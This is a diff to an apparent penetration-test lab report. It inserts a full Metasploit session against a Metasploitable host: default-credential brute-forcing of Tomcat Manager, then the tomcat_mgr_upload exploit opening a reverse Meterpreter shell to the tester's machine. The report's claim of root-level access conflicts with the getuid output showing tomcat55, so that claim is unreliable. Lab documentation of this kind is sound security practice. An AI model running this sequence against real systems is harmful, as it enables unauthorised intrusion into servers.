@@ -113,18 +113,136 @@ and potential impact.
 Tool Used: Metasploit Framework
 
 ### Activities
-Selection of exploit modules based on identified services
-```
-selection command prompt needed
 ```
 
-Successful exploitation of vulnerable service
-```
-command prommpt text needed
-```
-Shell access obtained on the target system
-```
-full working bash shell needed 
+msf > search auxiliary/scanner/http/tomcat_mgr_logi
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank    Check  Description
+   -  ----                                     ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/tomcat_mgr_login  .                normal  No     Tomcat Application Manager Login Utility
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/tomcat_mgr_login
+
+msf > use 0
+msf auxiliary(scanner/http/tomcat_mgr_login) > options                                                                                                      
+                                                                                                                                                            
+Module options (auxiliary/scanner/http/tomcat_mgr_login):                                                                                                   
+                                                                                                                                                            
+   Name              Current Setting                              Required  Description                                                                     
+   ----              ---------------                              --------  -----------                                                                     
+   ANONYMOUS_LOGIN   false                                        yes       Attempt to login with a blank username and password                             
+   BLANK_PASSWORDS   false                                        no        Try blank passwords for all users                                               
+   BRUTEFORCE_SPEED  5                                            yes       How fast to bruteforce, from 0 to 5                                             
+   DB_ALL_CREDS      false                                        no        Try each user/password couple stored in the current database                    
+   DB_ALL_PASS       false                                        no        Add all passwords in the current database to the list                           
+   DB_ALL_USERS      false                                        no        Add all users in the current database to the list                               
+   DB_SKIP_EXISTING  none                                         no        Skip existing credentials stored in the current database (Accepted: none, user  
+                                                                            , user&realm)                                                                   
+   PASSWORD                                                       no        The HTTP password to specify for authentication                                 
+   PASS_FILE         /usr/share/metasploit-framework/data/wordli  no        File containing passwords, one per line                                         
+                     sts/tomcat_mgr_default_pass.txt                                                                                                        
+   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxie  
+                                                                            s: sapni, socks4, socks5, socks5h, http                                         
+   RHOSTS                                                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi  
+                                                                            cs/using-metasploit.html                                                        
+   RPORT             8080                                         yes       The target port (TCP)                                                           
+   SSL               false                                        no        Negotiate SSL/TLS for outgoing connections                                      
+   STOP_ON_SUCCESS   false                                        yes       Stop guessing when a credential works for a host                                
+   TARGETURI         /manager/html                                yes       URI for Manager login. Default is /manager/html                                 
+   THREADS           1                                            yes       The number of concurrent threads (max one per host)                             
+   USERNAME                                                       no        The HTTP username to specify for authentication                                 
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordli  no        File containing users and passwords separated by space, one pair per line       
+                     sts/tomcat_mgr_default_userpass.txt                                                                                                    
+   USER_AS_PASS      false                                        no        Try the username as the password for all users                                  
+   USER_FILE         /usr/share/metasploit-framework/data/wordli  no        File containing users, one per line                                             
+                     sts/tomcat_mgr_default_users.txt                                                                                                       
+   VERBOSE           true                                         yes       Whether to print output for all attempts                                        
+   VHOST                                                          no        HTTP server virtual host                                                        
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
+rport => 8180
+msf auxiliary(scanner/http/tomcat_mgr_login) > run
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:toor (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:password1 (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:j2deployer (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:kdsxc (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:owaspba (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:ADMIN (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: root:xampp (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:root (Incorrect)
+[+] 192.168.56.5:8180 - Login Successful: tomcat:tomcat
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:admin (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:manager (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:role1 (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:root (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:tomcat (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:s3cret (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:vagrant (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:QLogic66 (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:password (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:Password1 (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:changethis (Incorrect)
+[-] 192.168.56.5:8180 - LOGIN FAILED: both:r00t (Incorrect)
+
+msf auxiliary(scanner/http/tomcat_mgr_login) > search tomcat_mgr_upload
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/multi/http/tomcat_mgr_upload  2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   1    \_ target: Java Universal           .                .          .      .
+   2    \_ target: Windows Universal        .                .          .      .
+   3    \_ target: Linux x86                .                .          .      .
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/tomcat_mgr_upload
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux x86'
+
+msf exploit(multi/http/tomcat_mgr_upload) > set httppassword tomcat
+httppassword => tomcat
+msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
+httpusername => tomcat
+msf exploit(multi/http/tomcat_mgr_upload) > set lhost 192.168.56.3
+lhost => 192.168.56.3
+msf exploit(multi/http/tomcat_mgr_upload) > set rport 8180
+rport => 8180
+msf exploit(multi/http/tomcat_mgr_upload) > set rhosts 192.168.56.5
+rhosts => 192.168.56.5
+msf exploit(multi/http/tomcat_mgr_upload) > run
+[*] Started reverse TCP handler on 192.168.56.3:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying kMq3r2BYfNT...
+[*] Executing kMq3r2BYfNT...
+[*] Undeploying kMq3r2BYfNT ...
+[*] Undeployed at /manager/html/undeploy
+[*] Sending stage (58073 bytes) to 192.168.56.5
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] Meterpreter session 1 opened (192.168.56.3:4444 -> 192.168.56.5:37998) at 2026-01-06 04:55:45 -0500
+
+meterpreter > sysinfo
+Computer        : metasploitable
+OS              : Linux 2.6.24-16-server (i386)
+Architecture    : x86
+System Language : en_US
+Meterpreter     : java/linux
+meterpreter > getuid
+Server username: tomcat55
+
+
 ```
 ### Result
 The target system was successfully compromised, and root-level access was
